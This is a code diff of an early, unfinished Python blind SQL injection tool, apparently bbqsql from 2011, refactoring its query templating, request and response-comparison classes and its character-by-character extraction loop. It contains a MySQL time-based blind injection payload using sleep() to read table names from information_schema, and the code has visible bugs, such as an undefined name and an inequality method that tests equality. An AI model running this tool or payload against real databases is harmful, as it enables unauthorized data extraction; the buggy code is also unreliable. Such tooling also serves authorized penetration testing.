@@ -1,9 +1,9 @@
 ##NOT FINISHED##
 ##mastahyeti 2011##
-import urllib2
-import urllib
-import time
-import math
+from requests import async
+from gevent.pool import Pool
+from copy import copy
+import gevent
 import debug
 from sys import stdout
 
@@ -33,13 +33,13 @@ class NotImplemented(Exception):
     def __repr__(self):
         return "This isn't implemented yet: " + self.value
 
-class query(object):
+class Query(object):
     '''
     A query is a string that can be rendered (think prinf). 
     query syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". 
     Anything inside ${} will be settable and will be rendered based on value set. For example: 
     
-    >>> q = bbqsql.query("hello ${x:world}")
+    >>> q = bbqsql.Query("hello ${x:world}")
     >>> print q.render()
     hello world
     >>> q.set_option('x','Ben')
@@ -129,24 +129,17 @@ class query(object):
                 output += right
         return output
 
-    @debug.func
-    def copy(self):
-        '''
-        Deep (enough) copy of a query
-        '''
-        return query(self.q_string,self.options)
 
-
-class technique(object):
+class Technique(object):
     '''
-    This is a sql injection teqnique. Eg. Union based or Time based. Techniques need
+    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
     to implement at minimum the run method which is what actually launches the technique.
     Techniques will usually also take a user_query (query we are trying to run on the db).
     The class init init will (almost?) always take a make_request_func as a param. This
     option specifies the function to call to make an actual request. 
     '''
     @debug.func
-    def __init__(self,make_request_func,query): 
+    def __init__(self,make_request_func,query,concurrency=1): 
         self.query = query
         self.make_request_func = make_request_func
         if type(self) == technique:
@@ -154,24 +147,22 @@ class technique(object):
 
     def run(self):
         '''
-        This is a prototype. This will run the technique (exploit the vuln).
+        run the exploit
         '''
         raise NotImplemented("technique.run")
 
 
-class blind_technique(technique):
-    '''
-    This is a prototype for a blind sql injection technique. This isn't fully implemented
-    because there are various types of blind sql injection. To implement this technique you 
-    need to implement _is_greater, _is_equal, _make_base_request. 
-    '''
+class BlindTechnique(Technique):
     @debug.func
     def run(self,user_query):
+        
         user_query = user_query
+
         try:
             self.base_response
         except AttributeError:
             self._make_base_request()
+    
         results = []
         row_index = 0
         row = True
@@ -186,7 +177,7 @@ class blind_technique(technique):
 
     @debug.func
     def _get_next_row(self,row_index,user_query):
-        #finding a row
+        '''finding a row'''
         row = ""
         char_index = 1
         char = True
@@ -204,7 +195,7 @@ class blind_technique(technique):
 
     @debug.func
     def _get_next_char(self,char_index,row_index,user_query):
-        #finding a character
+        '''finding a character'''
         low = 0
         high = CHARSET_LEN
         while low < high:
@@ -221,184 +212,121 @@ class blind_technique(technique):
         else:
             end_line()
             return False
-
-    def _is_greater(self,row_index,char_index,char_val):
+    
+    @debug.func
+    def _is_greater(self,row_index,char_index,char_val,user_query):
         '''
         Returns true if the specified character in the specified row is greater
         that char_value. It is up to you how to implement this...
         '''
-        raise NotImplemented("blind_technique._is_greater")
+        query = copy(self.query)
+        query.set_option('user_query',user_query)
+        query.set_option('row_index',str(row_index))
+        query.set_option('char_index',str(char_index))
+        query.set_option('char_val',str(ord(char_val)))
+        query.set_option('sleep',str(self.sleep))
+        query.set_option('comparator','>')
+        query_string = query.render()
+        #if the response differs from the base_response, we return true
+        return self.make_request_func(query_string) != self.base_response
 
-    def _is_equal(self,row_index,char_index,char_val):
+    @debug.func
+    def _is_equal(self,row_index,char_index,char_val,user_query):
         '''
         Returns true if the specified character in the specified row is equal
         that char_value. It is up to you how to implement this...
-        '''        
-        raise NotImplemented("blind_technique._is_equal")
+        '''  
+        query = copy(self.query)
+        query.set_option('user_query',user_query)
+        query.set_option('row_index',str(row_index))
+        query.set_option('char_index',str(char_index))
+        query.set_option('char_val',str(ord(char_val)))
+        query.set_option('sleep',str(self.sleep))
+        query.set_option('comparator','=')
+        query_string = query.render()
+        res = self.make_request_func(query_string)
+        #if the response differs from the base_response, we return true
+        return self.make_request_func(query_string) != self.base_response
     
+    @debug.func
     def _make_base_request(self):
         '''
         Makes the base request to which all subsequent requests will be compared.
         The need for a base request is just a fact when dealing with blind sqli
         '''
-        raise NotImplemented("blind_technique.make_base_request")
-
-
-class time_blind_technique(blind_technique):
-    '''
-    This is a time based blind sqli technique. 
-    The only thing that isn't implemented for this to work is
-    the actuall query strings which will varry between DBMSs. 
-    See below (mysql_time_blind_technique) for a fully functional
-    technique.
-    '''
-    @debug.func
-    def __init__(self,make_request_func,sleep=2):
-        self.sleep = sleep
-        super(time_blind_technique,self).__init__(make_request_func)
-        if type(self) == time_blind_technique:
-            raise NotImplemented('time_blind_technique is dbms agnostic and hence cannot be run...')
-    
-    @debug.func
-    def _is_greater(self,row_index,char_index,char_val,user_query):
-        query = self.query.copy()
-        query.set_option('user_query',user_query)
-        query.set_option('row_index',str(row_index))
-        query.set_option('char_index',str(char_index))
-        query.set_option('char_val',str(ord(char_val)))
-        query.set_option('sleep',str(self.sleep))
-        query.set_option('sign','>')
-        query_string = query.render()
-        res = self.make_request_func(query_string)
-        return not res.time_eq(self.base_response)
-
-    @debug.func
-    def _is_equal(self,row_index,char_index,char_val,user_query):
-        query = self.query.copy()
-        query.set_option('user_query',user_query)
-        query.set_option('row_index',str(row_index))
-        query.set_option('char_index',str(char_index))
-        query.set_option('char_val',str(ord(char_val)))
-        query.set_option('sleep',str(self.sleep))
-        query.set_option('sign','=')
-        query_string = query.render()
-        res = self.make_request_func(query_string)
-        return not res.time_eq(self.base_response)
-    
-    @debug.func
-    def _make_base_request(self):
         self.base_response = self.make_request_func()
 
 
-from requests import Request
-class get_http_requester(Request):
-    '''
-    This object makes requests. You configure it upon instantiation and then
-    call the make_request method with the modifications to be made to the base request.
-    For example: you setup the object to make HTTP GET requests to 
-    http://example.com?search=foo . To test different variations of the search 
-    parameter, you then call the make_request method, specifying what values
-    you would like to use.
-    '''
+class Requester(object):
     @debug.func
-    def __init__(
-        self,
-        url,
-        port=80,
-        uri=query("/"),
-        query_string=query(""),
-        headers={},
-        data={}):
-
-        self.url = url
-        self.port = port
-        self.uri = uri
-        self.uri_injection_points = uri_injection_points
-        self.query_string = query_string
-        self.query_injection_points = query_injection_points
-        self.headers = headers
-        self.headers_injection_points = headers_injection_points
-        self.data = data
-        self.data_injection_points = data_injection_points
-
-        #make sure our URI starts with a /
-        if uri[0] != '/': uri = "/" + uri
-        
-    @debug.func
-    def make_request(self,value=""):
-        '''
-        This method makes the requests. By the time you are calling this, the class
-        should already be set up. The value you provide to this method gets
-        included into the part of the request that you set up during 
-        instantiation. 
-        '''
-        #set up some vars
-        uri = self.uri
-        query_string = self.query_string.copy()
-        headers = self.headers.copy()
-        data = self.data.copy()
-        #parse all of the injection points
-        for r in self.uri_injection_points:
-            uri.replace(r,urllib.urlencode(value))
-        for r in self.query_injection_points:
-            query_string[r] = query_string.get(r,"") + value
-        for r in self.headers_injection_points:
-            headers[r] = headers.get(r,"") + urllib.urlencode(value)
-        for r in self.data_injection_points:
-            data[r] = data.get(r,"") + value
-        #build out a few things
-        query_string = urllib.urlencode(query_string)
-        data = urllib.urlencode(data)
-        #construct out request_url
-        request_url = self.url + ":" + str(self.port) + uri + '?' + query_string
-        #build a urllib2.Request object
-        request = urllib2.Request(request_url,headers=headers,data=data)
-        #prepare our variables for our response object
-        time_start = time.time()
-        raw_res = urllib2.urlopen(request)
-        time_stop  = time.time()
-        time_delta = time_stop - time_start
-        data = raw_res.read()
-        #create our response object
-        res = http_response(data,time_delta)
-        return res
-
-
-class http_response(object):
-    '''
-    Response objects abstract away the various response types gererated by
-    various request types. Response objects should implement methods
-    for comparing responses based on size, time, value..... This is just 
-    an example http response object
-    '''
-    @debug.func
-    def __init__(self,data,time_delta):
-        self.data = data
-        self.time_delta = time_delta
+    def __init__( self , request , send_request_function ,  response_cmp_function = cmp ):
+        self.request = request
+        self.send_request_function = send_request_function
+        self.response_cmp_function = response_cmp_function
     
     @debug.func
-    def get_time(self):
-        return self.time_delta
+    def make_request(self,value=""):
+        new_request = copy(self.request)
+        #iterate over the __dict__ of the request and compile any elements that are 
+        #query objects.
+        for elt in [q for q in new_request.__dict__ if isinstance(new_request.__dict__[q],Query)]:
+            opts = new_request.__dict__[elt].get_options()
+            for opt in opts:
+                opts[opt] = value
+            new_request.__dict__[elt].set_options(opts)
+            new_request.__dict__[elt] = new_request.__dict__[elt].render()
+        
+        #the function we are going to call
+        function_to_call = self.send_request_function
+        #if the function they sent us is a string, we will get that attr from the request and call it
+        #with the args and kwargs passed to us.
+        if type(self.send_request_function) == str:
+            function_to_call = getattr(new_request,self.send_request_function)
+            args = []
+        #otherwise we will send new_request as the first argument to self.send_request_function
+        else:
+            args = [new_request]
 
-    @debug.func
-    def get_data(self):
-        return self.data
+        if not hasattr(func,"__call__"):
+            raise Exception('the send_request_function you passed to Requester doesnt exist in the request object you passed')
+        
+        return Response( response = function_to_call(*args) , cmp_function = self.response_cmp_function )
+        
 
+class Response(object):
+    '''
+    This object is essentially a proxy for whatever type of response object you pass to it.
+    The value is that you are able to assign a function for doing comparisons.
+    '''
     @debug.func
-    def data_eq(self,response):
-        '''
-        return true if the data in this and response are the same
-        '''
-        return self.data == response.get_data()
+    def __init__( self , response , cmp_function = cmp ):
+        self.response = response
+        self.cmp_function = cmp_function
 
-    @debug.func
-    def time_eq(self,response,error_percent=75):
-        '''
-        return true if the time for this and the response are roughly the same.
-        #TODO: At some point this will be more flexible....
-        '''
-        #we call them equal if their times differ by less than 75 percent from the base. this should be adjusted in the future for performace optimization TODO
-        return error_percent > (math.fabs(self.time_delta - response.get_time())/((self.time_delta - response.get_time())/2))*100
+    def __getattr__( self , attr ):
+        return self.response.__getattr__( attr )
+    
+    def __setattr__( self , attr , value ):
+        return self.response.__setattr__(attr,value)
+    
+    def __getitem__( self , key ):
+        return self.response.__getitem__(key)
+    
+    def __setitem__( self , key , value ):
+        return self.response.__setitem__(key,value)
+    
+    def __gt__( self , y ):
+        return self.cmp_function(self,y) > 0
+    
+    def __lt__( self , y ):
+        return self.cmp_function(self,y) < 0
+    
+    def __eq__( self , y ):
+        return self.cmp_function(self,y) == 0
+    
+    def __ne__( self , y ):
+        return self.cmp_function(self,y) == 0
+    
 
 @debug.func
 def update_char(c=None):
@@ -430,4 +358,5 @@ def end_line():
         stdout.flush()
 
 if __name__ == "__main__":
-    mysql_query = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))${sign}${char_val:123},sleep(${sleep:2}),0)=0")
+    pass
+    #mysql_query = Query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))${comparator}${char_val:123},sleep(${sleep:2}),0)=0")
